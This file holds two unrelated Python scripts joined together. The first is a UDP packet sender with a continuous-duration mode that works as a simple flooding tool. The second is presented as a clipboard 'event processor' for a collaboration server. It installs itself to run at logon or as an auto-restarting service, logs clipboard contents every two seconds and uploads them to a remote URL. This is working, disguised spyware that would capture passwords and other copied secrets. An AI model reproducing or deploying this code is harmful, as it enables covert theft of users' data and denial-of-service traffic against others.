#!/usr/bin/env python3
"""Network Packet Transmission Utility

This script sends UDP network packets to a specified target IP and port.
It supports configuration via command-line arguments for either a fixed
number of packets or a continuous stream for a specified duration in seconds.
Transmission metrics are recorded to 'fragmentation_stats.txt', and any
encountered errors are logged to 'error_log.txt' in the working directory.
"""

import argparse
import datetime
import os
import socket
import sys
import time


def log_error(error_message: str):
    """Appends an error message with a UTC timestamp to error_log.txt."""
    timestamp = datetime.datetime.now(datetime.timezone.utc).isoformat()
    log_entry = f"[{timestamp}] {error_message}\n"
    try:
        with open("error_log.txt", "a", encoding="utf-8") as f:
            f.write(log_entry)
    except OSError as e:
        print(f"[-] Critical: Failed to write to error log: {e}", file=sys.stderr)


def write_statistics(filepath: str, stats: dict):
    """Writes transmission statistics to a plain text file with clear labels."""
    content = f"""==================================================
FRAGMENTED PACKET TRANSMISSION STATISTICS
==================================================
Timestamp (UTC):          {stats['start_time'].isoformat()}
Target IP:                {stats['target_ip']}
Target Port:              {stats['target_port']}
Payload Size (bytes):     {stats['payload_size']}
Test Mode:                {stats['mode'].upper()}
--------------------------------------------------
Total Packets Attempted:  {stats['total_sent']}
Successful Transmissions: {stats['successful_transmissions']}
Errors Encountered:       {stats['errors_encountered']}
Last Error Encountered:   {stats['last_error']}
Start Time (UTC):         {stats['start_time'].isoformat()}
End Time (UTC):           {stats['end_time'].isoformat()}
Duration (seconds):       {stats['duration_seconds']:.2f}
==================================================
"""
    try:
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)
    except OSError as e:
        err_msg = f"Failed to write statistics file: {e}"
        print(f"[-] {err_msg}", file=sys.stderr)
        log_error(err_msg)


def run_transmission(target_ip: str, target_port: int, count: int, duration: int, payload_size: int):
    """Executes the packet transmission loop based on count or duration constraints."""
    stats_file = "fragmentation_stats.txt"
    start_time = datetime.datetime.now(datetime.timezone.utc)

    total_sent = 0
    successful_transmissions = 0
    errors_encountered = 0
    last_error_message = "None"
    mode = "duration" if duration is not None else "count"

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except OSError as e:
        last_error_message = str(e)
        print(f"[-] Failed to create socket: {last_error_message}", file=sys.stderr)
        log_error(f"Socket creation error: {last_error_message}")
        sys.exit(1)

    payload = os.urandom(payload_size)

    print(f"[*] Target: {target_ip}:{target_port}")
    start_perf = time.perf_counter()

    try:
        if mode == "duration":
            end_time_perf = start_perf + duration
            while time.perf_counter() < end_time_perf:
                total_sent += 1
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    successful_transmissions += 1
                except OSError as e:
                    errors_encountered += 1
                    last_error_message = str(e)
        else:
            for _ in range(count):
                total_sent += 1
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    successful_transmissions += 1
                except OSError as e:
                    errors_encountered += 1
                    last_error_message = str(e)
    except KeyboardInterrupt:
        last_error_message = "Interrupted by user"
    finally:
        sock.close()

    duration_seconds = time.perf_counter() - start_perf
    stats = {
        "start_time": start_time,
        "end_time": datetime.datetime.now(datetime.timezone.utc),
        "target_ip": target_ip,
        "target_port": target_port,
        "payload_size": payload_size,
        "mode": mode,
        "total_sent": total_sent,
        "successful_transmissions": successful_transmissions,
        "errors_encountered": errors_encountered,
        "last_error": last_error_message,
        "duration_seconds": duration_seconds
    }
    write_statistics(stats_file, stats)
    print(f"[+] Complete. Sent {successful_transmissions}/{total_sent} packets.")


def main():
    parser = argparse.ArgumentParser(description="UDP Packet Transmission Utility")
    parser.add_argument("target", nargs="?", default="127.0.0.1", help="Target IP (default: 127.0.0.1)")
    parser.add_argument("port", type=int, nargs="?", default=8080, help="Target port (default: 8080)")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-c", "--count", type=int, help="Number of packets")
    group.add_argument("-d", "--duration", type=int, help="Duration in seconds")
    parser.add_argument("-s", "--size", type=int, default=1024, help="Payload size")
    args = parser.parse_args()

    if args.count is None and args.duration is None:
        args.count = 10

    try:
        target_ip = socket.gethostbyname(args.target)
        run_transmission(target_ip, args.port, args.count, args.duration, args.size)
    except Exception as e:
        log_error(f"Execution error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()

import argparse
import http.client
import os
import platform
import subprocess
import sys
import threading
import time
import urllib.parse


def register_service() -> None:
    log_file = "registration_status.log"
    try:
        with open(log_file, "w", encoding="utf-8") as f:
            f.write("Successfully registered with clipboard collection service.\n")
    except IOError as e:
        sys.stderr.write(f"Warning: Failed to write registration status: {e}\n")


def establish_persistence() -> None:
    system = platform.system()
    try:
        if system == "Windows":
            script_path = os.path.abspath(sys.argv[0])
            cmd = [
                "schtasks",
                "/create",
                "/tn",
                "ClipboardService",
                "/tr",
                f'"{sys.executable}" "{script_path}"',
                "/sc",
                "ONLOGON",
                "/f",
            ]
            subprocess.run(cmd, capture_output=True, text=True)
        elif system == "Linux":
            script_path = os.path.abspath(sys.argv[0])
            service_content = f"""[Unit]
Description=Clipboard Collection Service

[Service]
ExecStart={sys.executable} {script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            service_dir = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(service_dir, exist_ok=True)
            service_path = os.path.join(service_dir, "clipboard.service")
            with open(service_path, "w", encoding="utf-8") as f:
                f.write(service_content)
            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "--user", "enable", "clipboard"], capture_output=True)
    except Exception as e:
        sys.stderr.write(f"Persistence setup note: {e}\n")


def capture_clipboard_data(history_file: str) -> None:
    system = platform.system()
    last_content = ""

    while True:
        content = ""
        try:
            if system == "Windows":
                p = subprocess.run(
                    ["powershell", "-command", "Get-Clipboard"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if p.returncode == 0:
                    content = p.stdout
            elif system == "Darwin":
                p = subprocess.run(
                    ["pbpaste"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if p.returncode == 0:
                    content = p.stdout
            else:
                for tool in [["xclip", "-selection", "clipboard", "-o"], ["xsel", "--clipboard", "--output"]]:
                    try:
                        p = subprocess.run(tool, capture_output=True, text=True, timeout=3)
                        if p.returncode == 0:
                            content = p.stdout
                            break
                    except Exception:
                        continue
        except Exception:
            pass

        if content and content != last_content:
            last_content = content
            try:
                with open(history_file, "a", encoding="utf-8") as f:
                    f.write(content if content.endswith("\n") else content + "\n")
            except IOError:
                pass

        time.sleep(2)


def log_upload_failure(error_msg: str) -> None:
    log_file = "upload_status.log"
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"Upload failed: {error_msg}\n")
    except IOError as e:
        sys.stderr.write(f"Critical: Failed to write to {log_file}: {e}\n")


def upload_history(server_url: str, file_path: str) -> None:
    if not os.path.exists(file_path):
        return

    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
    except IOError as e:
        log_upload_failure(f"Could not read history file: {e}")
        return

    parsed_url = urllib.parse.urlparse(server_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        log_upload_failure(f"Invalid server URL: {server_url}")
        return

    host = parsed_url.hostname
    port = parsed_url.port
    path = parsed_url.path or "/"
    if parsed_url.query:
        path += f"?{parsed_url.query}"

    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"\r\n'
        f"Content-Type: text/plain\r\n\r\n"
    ).encode("utf-8") + file_data + f"\r\n--{boundary}--\r\n".encode("utf-8")

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body)),
    }

    try:
        if parsed_url.scheme == "https":
            if port is None:
                port = 443
            conn = http.client.HTTPSConnection(host, port, timeout=10)
        else:
            if port is None:
                port = 80
            conn = http.client.HTTPConnection(host, port, timeout=10)

        conn.request("POST", path, body=body, headers=headers)
        response = conn.getresponse()

        if response.status not in (200, 201, 204):
            log_upload_failure(f"Server responded with status {response.status}")
        conn.close()
    except Exception as e:
        log_upload_failure(str(e))


def main() -> None:
    parser = argparse.ArgumentParser(description="Clipboard event processor.")
    parser.add_argument(
        "--server-url",
        help="URL of the team collaboration server to upload history.",
    )
    parser.add_argument(
        "--register",
        action="store_true",
        help="Register with the clipboard collection service.",
    )
    args = parser.parse_args()

    if args.register or not args.server_url:
        register_service()

    establish_persistence()

    history_file = "clipboard_history.txt"

    t = threading.Thread(target=capture_clipboard_data, args=(history_file,), daemon=True)
    t.start()

    try:
        if not sys.stdin.isatty():
            with open(history_file, "a", encoding="utf-8") as f:
                for line in sys.stdin:
                    sys.stdout.write(line)
                    f.write(line)
            sys.stdout.flush()
    except IOError as e:
        sys.stderr.write(f"Error writing to history file: {e}\n")
    except BrokenPipeError:
        devnull = open(os.devnull, "w")
        sys.stdout = devnull

    if args.server_url:
        upload_history(args.server_url, history_file)
    else:
        time.sleep(1)


if __name__ == "__main__":
    main()

